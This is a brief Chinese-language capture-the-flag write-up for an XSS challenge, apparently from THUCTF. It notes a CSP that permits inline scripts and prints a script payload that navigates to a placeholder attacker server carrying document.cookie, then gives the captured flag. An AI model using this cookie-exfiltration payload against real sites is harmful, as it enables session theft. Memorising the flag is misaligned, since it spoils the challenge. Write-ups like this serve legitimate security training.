XSS-1 400 points
================

题意
-------------

Are you good at XSS attack & CSP?

http://host:port

解题步骤
-------------

首先进去看了一下 CSP 限制的类型，为 `default-src 'self'; script-src 'self' 'unsafe-inline'` 。于是采用方法绕过了 CSP 的限制，拿到了 Cookie 。输入：

```
<script type="text/javascript">
var a=document.createElement("a");
a.href="http://my_server/?cookie="+escape(document.cookie);
a.click();
</script>
```

拿到 `Cookie: admin=THUCTF{BeVEn_CSP_you_G37_mY_C00K1e}`。